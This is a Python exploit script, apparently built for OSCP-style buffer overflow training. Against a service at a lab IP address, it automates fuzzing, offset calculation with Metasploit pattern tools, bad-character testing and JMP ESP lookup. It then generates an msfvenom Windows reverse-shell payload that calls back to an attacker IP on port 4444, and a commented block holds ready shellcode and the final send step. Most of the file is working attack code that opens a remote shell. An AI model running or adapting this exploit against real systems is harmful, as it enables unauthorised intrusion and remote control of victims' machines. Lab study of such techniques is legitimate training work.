#!/usr/bin/env python3
import socket, subprocess, time, sys

ip = "10.10.62.124"
port = 1337
prefix = input("Paste command on vulnerable service (put space after command): ")
timeout = 5
string = prefix + "A" * 100
fuzzing_size = 0

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    fuzzing_size = len(string) - len(prefix)
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    break
  string += 100 * "A"
  time.sleep(1)


input("Restart program and set workingfolder in mona: !mona config -set workingfolder c:\\mona\\%p")
print(fuzzing_size)
####Fuzzing####
pattern_size = fuzzing_size + 400
pattern_create = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l " + str(pattern_size)
result_create = subprocess.run([pattern_create], capture_output=True, text=True, shell=True).stdout.strip()

offset = 0
overflow = result_create
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer..." + "\r\n" + buffer)
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

####Calculating offset#####
eip_addr = input("Paste the EIP value: ")
pattern_offset = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q " + eip_addr + " -l " + str(pattern_size)
result_offset = subprocess.run([pattern_offset], capture_output=True, text=True, shell=True).stdout.strip()
print("Offset is: " + result_offset)


####Finding badchars####
list_result = list(result_offset.split(" "))
length = len(list_result)
offset = int(list_result[length - 1])
overflow = "A" * offset
retn = "BBBB"
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
buffer = prefix + overflow + retn + padding + payload + postfix

badChars = "\\x00"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

input("Restart the program")
print("Use mona in Immunity to find bad chars")
input("1. !mona bytearray -b \"" + badChars + "\"")

try:
  s.connect((ip, port))
  print("Sending badchars payload..." + "\r\n" + buffer)
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

print("2. Make a note of the address to which the ESP register points and use it in the following mona command:\r\n!mona compare -f C:\\mona\\oscp\\bytearray.bin -a <address>")
badChars = input("Paste found badChars: ")

####Finding JMP address####
print("Find JMP address - !mona jmp -r esp -cpb \"" + badChars + "\"")
retn = input("Paste JMP address (after conversion to little endian): ")

####Generate payload####
attacker_ip = "10.8.144.206"
padding = "\x90"*16

print("Generating payload with msfvenom")
msfvenom_command = "msfvenom -p windows/shell_reverse_tcp LHOST=" + attacker_ip + " LPORT=4444 EXITFUNC=thread -b \"" + badChars + "\" -f c"
print("msfvenom command: " + msfvenom_command)
msfvenom_payload = subprocess.run([msfvenom_command], capture_output=True, text=True, shell=True).stdout.strip()
print("Payload is: " + msfvenom_payload)
print("Please manually check msfvenom results")
"""
payload = "\xfc\xbb\x1f\xcc\xc5\x87\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xe3\x24\x47\x87\x1b\xb5\x28\x01\xfe\x84\x68\x75\x8b\xb7\x58\xfd\xd9\x3b\x12\x53\xc9\xc8\x56\x7c\xfe\x79\xdc\x5a\x31\x79\x4d\x9e\x50\xf9\x8c\xf3\xb2\xc0\x5e\x06\xb3\x05\x82\xeb\xe1\xde\xc8\x5e\x15\x6a\x84\x62\x9e\x20\x08\xe3\x43\xf0\x2b\xc2\xd2\x8a\x75\xc4\xd5\x5f\x0e\x4d\xcd\xbc\x2b\x07\x66\x76\xc7\x96\xae\x46\x28\x34\x8f\x66\xdb\x44\xc8\x41\x04\x33\x20\xb2\xb9\x44\xf7\xc8\x65\xc0\xe3\x6b\xed\x72\xcf\x8a\x22\xe4\x84\x81\x8f\x62\xc2\x85\x0e\xa6\x79\xb1\x9b\x49\xad\x33\xdf\x6d\x69\x1f\xbb\x0c\x28\xc5\x6a\x30\x2a\xa6\xd3\x94\x21\x4b\x07\xa5\x68\x04\xe4\x84\x92\xd4\x62\x9e\xe1\xe6\x2d\x34\x6d\x4b\xa5\x92\x6a\xac\x9c\x63\xe4\x53\x1f\x94\x2d\x90\x4b\xc4\x45\x31\xf4\x8f\x95\xbe\x21\x1f\xc5\x10\x9a\xe0\xb5\xd0\x4a\x89\xdf\xde\xb5\xa9\xe0\x34\xde\x40\x1b\xdf\xeb\x9c\xb3\xd1\x84\x9e\xb3\xfc\x08\x16\x55\x94\xa0\x7e\xce\x01\x58\xdb\x84\xb0\xa5\xf1\xe1\xf3\x2e\xf6\x16\xbd\xc6\x73\x04\x2a\x27\xce\x76\xfd\x38\xe4\x1e\x61\xaa\x63\xde\xec\xd7\x3b\x89\xb9\x26\x32\x5f\x54\x10\xec\x7d\xa5\xc4\xd7\xc5\x72\x35\xd9\xc4\xf7\x01\xfd\xd6\xc1\x8a\xb9\x82\x9d\xdc\x17\x7c\x58\xb7\xd9\xd6\x32\x64\xb0\xbe\xc3\x46\x03\xb8\xcb\x82\xf5\x24\x7d\x7b\x40\x5b\xb2\xeb\x44\x24\xae\x8b\xab\xff\x6a\xab\x49\xd5\x86\x44\xd4\xbc\x2a\x09\xe7\x6b\x68\x34\x64\x99\x11\xc3\x74\xe8\x14\x8f\x32\x01\x65\x80\xd6\x25\xda\xa1\xf2\x25\xdc\x5d\xfd"

buffer = prefix + overflow + retn + padding + payload + postfix
print("Buffer: " + buffer)
input("Restart the program")
try:
  s.connect((ip, port))
  print("Sending reverse payload..." + "\r\n" + buffer)
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except Exception as error:
  print(error)
"""